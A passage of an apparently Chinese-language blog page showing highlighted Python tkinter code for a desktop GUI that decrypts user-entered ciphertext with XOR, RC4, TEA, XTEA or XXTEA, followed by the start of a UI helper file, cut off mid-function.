class="string">&quot;&quot;&quot;打开算法选择窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window = tk.Toplevel(<span class="variable language_">self</span>.root)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.title(<span class="string">&quot;💡 选择解密算法&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.geometry(<span class="string">&quot;600x400&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.algorithm_window.transient(<span class="variable language_">self</span>.root)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 创建半透明背景（仅在视频加载失败时显示）</span></span><br><span class="line">        bg = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">            width=<span class="number">600</span>,</span><br><span class="line">            height=<span class="number">400</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        bg.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 标题</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">            <span class="string">&quot;选择解密算法&quot;</span>,</span><br><span class="line">            font_size=<span class="number">24</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔐&quot;</span></span><br><span class="line">        )</span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, y=<span class="number">30</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分隔线</span></span><br><span class="line">        sep = tk.Frame(<span class="variable language_">self</span>.algorithm_window, height=<span class="number">2</span>, bg=<span class="string">&quot;#4ECDC4&quot;</span>)</span><br><span class="line">        sep.place(x=<span class="number">50</span>, y=<span class="number">70</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 算法按钮配置</span></span><br><span class="line">        algorithms = [</span><br><span class="line">            (<span class="string">&quot;xor&quot;</span>, <span class="string">&quot;❌ XOR解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;rc4&quot;</span>, <span class="string">&quot;🔒 RC4解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;tea&quot;</span>, <span class="string">&quot;🍵 TEA解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;xtea&quot;</span>, <span class="string">&quot;🍵 XTEA解密&quot;</span>),</span><br><span class="line">            (<span class="string">&quot;xxtea&quot;</span>, <span class="string">&quot;🍵 XXTEA解密&quot;</span>),</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> idx, (alg, text) <span class="keyword">in</span> <span class="built_in">enumerate</span>(algorithms):</span><br><span class="line">            btn = tk.Button(</span><br><span class="line">                <span class="variable language_">self</span>.algorithm_window,</span><br><span class="line">                text=text,</span><br><span class="line">                font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">14</span>, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">                bg=<span class="string">&quot;#4ECDC4&quot;</span>,</span><br><span class="line">                fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">                relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">                command=<span class="keyword">lambda</span> a=alg: <span class="variable language_">self</span>.open_decrypt_window(a)</span><br><span class="line">            )</span><br><span class="line">            x = <span class="number">100</span> <span class="keyword">if</span> idx % <span class="number">2</span> == <span class="number">0</span> <span class="keyword">else</span> <span class="number">350</span></span><br><span class="line">            y = <span class="number">120</span> + (idx // <span class="number">2</span>) * <span class="number">80</span></span><br><span class="line">            btn.place(x=x, y=y, width=<span class="number">200</span>, height=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_decrypt_window</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;打开解密窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 销毁已存在的解密窗口</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;decrypt_window&#x27;</span>) <span class="keyword">and</span> <span class="variable language_">self</span>.decrypt_window.winfo_exists():</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window.destroy()</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window = tk.Toplevel(<span class="variable language_">self</span>.root)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.title(<span class="string">f&quot;💬 <span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密面板&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.geometry(<span class="string">&quot;600x450&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line">        <span class="variable language_">self</span>.decrypt_window.transient(<span class="variable language_">self</span>.root)</span><br><span class="line"></span><br><span class="line">        panel = tk.Canvas(</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window,</span><br><span class="line">            width=<span class="number">600</span>,</span><br><span class="line">            height=<span class="number">450</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span>,</span><br><span class="line">            highlightthickness=<span class="number">0</span>,</span><br><span class="line">            bd=<span class="number">0</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        panel.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 标题</span></span><br><span class="line">        title = UIBuilder.create_title(</span><br><span class="line">            panel,</span><br><span class="line">            <span class="string">f&quot;<span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密工具&quot;</span>,</span><br><span class="line">            font_size=<span class="number">24</span>,</span><br><span class="line">            bg=<span class="string">&quot;black&quot;</span></span><br><span class="line">        )</span><br><span class="line">        title.place(relx=<span class="number">0.5</span>, y=<span class="number">30</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 分隔线</span></span><br><span class="line">        sep = tk.Frame(panel, height=<span class="number">2</span>, bg=<span class="string">&quot;#4ECDC4&quot;</span>)</span><br><span class="line">        sep.place(x=<span class="number">50</span>, y=<span class="number">70</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 算法说明</span></span><br><span class="line">        info = UIBuilder.create_algorithm_info(panel, algorithm)</span><br><span class="line">        info.place(x=<span class="number">50</span>, y=<span class="number">90</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密文输入框</span></span><br><span class="line">        cipher_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        cipher_frame.place(x=<span class="number">50</span>, y=<span class="number">130</span>, width=<span class="number">500</span>, height=<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">        cipher_label = UIBuilder.create_label(cipher_frame, <span class="string">&quot;密文:&quot;</span>, font_size=<span class="number">12</span>)</span><br><span class="line">        cipher_label.pack(anchor=<span class="string">&quot;w&quot;</span>, pady=(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry = tk.Text(</span><br><span class="line">            cipher_frame,</span><br><span class="line">            width=<span class="number">58</span>,</span><br><span class="line">            height=<span class="number">3</span>,</span><br><span class="line">            font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>),</span><br><span class="line">            bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            insertbackground=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            padx=<span class="number">10</span>,</span><br><span class="line">            pady=<span class="number">5</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry.pack(fill=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.cipher_entry.insert(<span class="string">&quot;1.0&quot;</span>, <span class="variable language_">self</span>.get_default_ciphertext(algorithm))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 密钥输入框</span></span><br><span class="line">        key_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        key_frame.place(x=<span class="number">50</span>, y=<span class="number">250</span>, width=<span class="number">500</span>, height=<span class="number">80</span>)</span><br><span class="line"></span><br><span class="line">        key_label = UIBuilder.create_label(key_frame, <span class="string">&quot;密钥:&quot;</span>, font_size=<span class="number">12</span>)</span><br><span class="line">        key_label.pack(anchor=<span class="string">&quot;w&quot;</span>, pady=(<span class="number">0</span>, <span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.key_entry = tk.Entry(</span><br><span class="line">            key_frame,</span><br><span class="line">            width=<span class="number">58</span>,</span><br><span class="line">            font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>),</span><br><span class="line">            bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            insertbackground=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.key_entry.pack(fill=<span class="string">&quot;x&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.key_entry.insert(<span class="number">0</span>, <span class="variable language_">self</span>.get_default_key(algorithm))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 按钮区域</span></span><br><span class="line">        btn_frame = tk.Frame(panel, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">        btn_frame.place(x=<span class="number">50</span>, y=<span class="number">340</span>, width=<span class="number">500</span>, height=<span class="number">40</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密按钮</span></span><br><span class="line">        decrypt_btn = UIBuilder.create_button(</span><br><span class="line">            btn_frame,</span><br><span class="line">            <span class="string">&quot;开始解密&quot;</span>,</span><br><span class="line">            <span class="keyword">lambda</span>: <span class="variable language_">self</span>.perform_decryption(algorithm),</span><br><span class="line">            bg=<span class="string">&quot;#FF6B6B&quot;</span>,</span><br><span class="line">            font_size=<span class="number">14</span>,</span><br><span class="line">            emoji=<span class="string">&quot;🔓&quot;</span></span><br><span class="line">        )</span><br><span class="line">        decrypt_btn.pack(side=<span class="string">&quot;left&quot;</span>, padx=(<span class="number">150</span>, <span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 返回按钮</span></span><br><span class="line">        back_btn = UIBuilder.create_button(</span><br><span class="line">            btn_frame,</span><br><span class="line">            <span class="string">&quot;返回&quot;</span>,</span><br><span class="line">            <span class="variable language_">self</span>.decrypt_window.destroy,</span><br><span class="line">            bg=<span class="string">&quot;#666666&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            emoji=<span class="string">&quot;◀&quot;</span></span><br><span class="line">        )</span><br><span class="line">        back_btn.pack(side=<span class="string">&quot;right&quot;</span>, padx=(<span class="number">0</span>, <span class="number">20</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 提示文本</span></span><br><span class="line">        hint = UIBuilder.create_label(</span><br><span class="line">            panel,</span><br><span class="line">            <span class="string">&quot;💡 提示: 输入密文和密钥后点击解密按钮&quot;</span>,</span><br><span class="line">            font_size=<span class="number">10</span>,</span><br><span class="line">            fg=<span class="string">&quot;#999999&quot;</span></span><br><span class="line">        )</span><br><span class="line">        hint.place(x=<span class="number">50</span>, y=<span class="number">400</span>, width=<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_algorithm_name</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取算法名称&quot;&quot;&quot;</span></span><br><span class="line">        names = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;XOR&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;RC4&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;TEA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;XTEA&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;XXTEA&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> names.get(algorithm, algorithm.upper())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_default_ciphertext</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取默认密文&quot;&quot;&quot;</span></span><br><span class="line">        defaults = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;1a2b3c4d5e6f&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;730e7d1c4a1e&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;0123456789abcdef&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> defaults.get(algorithm, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_default_key</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取默认密钥&quot;&quot;&quot;</span></span><br><span class="line">        defaults = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot;secret&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;key12345&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>,  <span class="comment"># 16字节密钥</span></span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>,  <span class="comment"># 16字节密钥</span></span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;1234567890123456&quot;</span>  <span class="comment"># 16字节密钥</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> defaults.get(algorithm, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_status_bar</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建状态栏&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.status = tk.Label(</span><br><span class="line">            <span class="variable language_">self</span>.root,</span><br><span class="line">            text=<span class="string">&quot;✨ 就绪 | linkpwn的解密工具 v1.0 | 安全解密 ✨&quot;</span>,</span><br><span class="line">            bd=<span class="number">1</span>,</span><br><span class="line">            relief=tk.SUNKEN,</span><br><span class="line">            anchor=tk.W,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">9</span>),</span><br><span class="line">            fg=<span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="variable language_">self</span>.status.pack(side=tk.BOTTOM, fill=tk.X)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">perform_decryption</span>(<span class="params">self, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;执行解密操作&quot;&quot;&quot;</span></span><br><span class="line">        ciphertext = <span class="variable language_">self</span>.cipher_entry.get(<span class="string">&quot;1.0&quot;</span>, tk.END).strip()</span><br><span class="line">        key = <span class="variable language_">self</span>.key_entry.get().strip()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ciphertext:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">&quot;🛑 错误: 密文不能为空&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">&quot;密文不能为空哦!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> key:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">&quot;🛑 错误: 密钥不能为空&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">&quot;密钥不能为空哦!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="variable language_">self</span>.status.config(text=<span class="string">f&quot;🔄 使用<span class="subst">&#123;self.get_algorithm_name(algorithm)&#125;</span>解密中...&quot;</span>)</span><br><span class="line">        threading.Thread(target=<span class="variable language_">self</span>._perform_decryption_thread, args=(ciphertext, key, algorithm), daemon=<span class="literal">True</span>).start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_perform_decryption_thread</span>(<span class="params">self, ciphertext, key, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;在单独的线程中执行解密操作&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 根据算法调用相应的解密函数</span></span><br><span class="line">            <span class="keyword">if</span> algorithm == <span class="string">&quot;xor&quot;</span>:</span><br><span class="line">                result = xor_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;rc4&quot;</span>:</span><br><span class="line">                result = rc4_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;tea&quot;</span>:</span><br><span class="line">                result = tea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;xtea&quot;</span>:</span><br><span class="line">                result = xtea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">elif</span> algorithm == <span class="string">&quot;xxtea&quot;</span>:</span><br><span class="line">                result = xxtea_decrypt(ciphertext, key)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">f&quot;🛑 不支持的算法: <span class="subst">&#123;algorithm&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.root.after(<span class="number">0</span>, <span class="variable language_">self</span>._update_decryption_result, result)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            error_msg = <span class="string">f&quot;🛑 解密过程中发生错误: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line">            <span class="variable language_">self</span>.root.after(<span class="number">0</span>, <span class="variable language_">self</span>._update_decryption_error, error_msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_decryption_result</span>(<span class="params">self, result</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;更新解密结果&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;错误&quot;</span> <span class="keyword">in</span> result <span class="keyword">or</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">f&quot;😢 解密失败: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 解密失败&quot;</span>, result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="variable language_">self</span>.status.config(text=<span class="string">&quot;🎉 解密成功!&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.show_result(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_update_decryption_error</span>(<span class="params">self, error_msg</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;更新解密错误&quot;&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.status.config(text=error_msg)</span><br><span class="line">        messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, error_msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_result</span>(<span class="params">self, plaintext</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示解密结果窗口（优化背景显示）&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            result_window = tk.Toplevel(<span class="variable language_">self</span>.decrypt_window)</span><br><span class="line">            result_window.title(<span class="string">&quot;🎁 解密结果&quot;</span>)</span><br><span class="line">            result_window.geometry(<span class="string">&quot;500x300&quot;</span>)</span><br><span class="line">            result_window.resizable(<span class="literal">False</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">            bg = tk.Canvas(result_window, width=<span class="number">500</span>, height=<span class="number">300</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span>)</span><br><span class="line">            bg.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            title = UIBuilder.create_title(</span><br><span class="line">                bg,</span><br><span class="line">                <span class="string">&quot;解密成功!&quot;</span>,</span><br><span class="line">                font_size=<span class="number">18</span>,</span><br><span class="line">                emoji=<span class="string">&quot;🎉&quot;</span>,</span><br><span class="line">                bg=<span class="string">&quot;#1a1a2e&quot;</span></span><br><span class="line">            )</span><br><span class="line">            title.place(relx=<span class="number">0.5</span>, y=<span class="number">40</span>, anchor=tk.CENTER)</span><br><span class="line"></span><br><span class="line">            result_frame = tk.Frame(bg, bg=<span class="string">&quot;#2a2a3e&quot;</span>, bd=<span class="number">1</span>, relief=tk.SUNKEN)</span><br><span class="line">            result_frame.place(x=<span class="number">25</span>, y=<span class="number">70</span>, width=<span class="number">450</span>, height=<span class="number">180</span>)</span><br><span class="line"></span><br><span class="line">            scrollbar = ttk.Scrollbar(result_frame)</span><br><span class="line">            scrollbar.pack(side=tk.RIGHT, fill=tk.Y)</span><br><span class="line"></span><br><span class="line">            result_text = tk.Text(</span><br><span class="line">                result_frame,</span><br><span class="line">                bg=<span class="string">&quot;#2a2a3e&quot;</span>,</span><br><span class="line">                fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">                font=(<span class="string">&quot;Consolas&quot;</span>, <span class="number">11</span>),</span><br><span class="line">                yscrollcommand=scrollbar.<span class="built_in">set</span>,</span><br><span class="line">                wrap=tk.WORD,</span><br><span class="line">                padx=<span class="number">10</span>,</span><br><span class="line">                pady=<span class="number">10</span></span><br><span class="line">            )</span><br><span class="line">            result_text.pack(fill=<span class="string">&quot;both&quot;</span>, expand=<span class="literal">True</span>)</span><br><span class="line">            result_text.insert(tk.END, plaintext)</span><br><span class="line">            result_text.config(state=tk.DISABLED)</span><br><span class="line">            scrollbar.config(command=result_text.yview)</span><br><span class="line"></span><br><span class="line">            close_btn = UIBuilder.create_button(</span><br><span class="line">                bg,</span><br><span class="line">                <span class="string">&quot;关闭&quot;</span>,</span><br><span class="line">                result_window.destroy,</span><br><span class="line">                bg=<span class="string">&quot;#4ECDC4&quot;</span>,</span><br><span class="line">                font_size=<span class="number">12</span></span><br><span class="line">            )</span><br><span class="line">            close_btn.place(relx=<span class="number">0.5</span>, y=<span class="number">260</span>, anchor=tk.CENTER)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            messagebox.showerror(<span class="string">&quot;😢 错误&quot;</span>, <span class="string">f&quot;无法显示结果: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">on_close</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;窗口关闭时停止视频播放&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(<span class="variable language_">self</span>, <span class="string">&#x27;video_bg&#x27;</span>) <span class="keyword">and</span> <span class="variable language_">self</span>.video_bg:</span><br><span class="line">            <span class="variable language_">self</span>.video_bg.stop_playback()</span><br><span class="line">        <span class="variable language_">self</span>.root.destroy()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># === 程序入口 ===</span></span><br><span class="line">DEBUG = <span class="literal">True</span>  <span class="comment"># 开发阶段设为True，发布时改为False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_app</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;运行应用程序&quot;&quot;&quot;</span></span><br><span class="line">    root = tk.Tk()</span><br><span class="line">    <span class="comment"># 设置窗口透明度（仅支持Windows和X11系统）</span></span><br><span class="line">    <span class="keyword">if</span> sys.platform <span class="keyword">in</span> [<span class="string">&#x27;win32&#x27;</span>, <span class="string">&#x27;linux&#x27;</span>]:</span><br><span class="line">        root.attributes(<span class="string">&#x27;-alpha&#x27;</span>, <span class="number">0.95</span>)  <span class="comment"># 95%透明度，保留视频背景效果</span></span><br><span class="line">    app = DecryptApp(root)</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_app()</span><br></pre></td></tr></table></figure>

<p>beautiful.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UIBuilder</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;UI构建器，负责创建美化后的界面元素&quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_button</span>(<span class="params">parent, text, command, bg=<span class="string">&quot;#4ECDC4&quot;</span>, fg=<span class="string">&quot;white&quot;</span>, font_size=<span class="number">12</span>, emoji=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建美化的按钮&quot;&quot;&quot;</span></span><br><span class="line">        full_text = <span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 安全的颜色调整函数</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">darken_color</span>(<span class="params">hex_color, factor=<span class="number">0.8</span></span>):</span><br><span class="line">            <span class="string">&quot;&quot;&quot;降低颜色亮度&quot;&quot;&quot;</span></span><br><span class="line">            hex_color = hex_color.lstrip(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            rgb = <span class="built_in">tuple</span>(<span class="built_in">int</span>(hex_color[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>))</span><br><span class="line">            darkened = <span class="built_in">tuple</span>(<span class="built_in">int</span>(<span class="built_in">max</span>(<span class="number">0</span>, <span class="built_in">min</span>(<span class="number">255</span>, c * factor))) <span class="keyword">for</span> c <span class="keyword">in</span> rgb)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;#<span class="subst">&#123;darkened[<span class="number">0</span>]:02x&#125;</span><span class="subst">&#123;darkened[<span class="number">1</span>]:02x&#125;</span><span 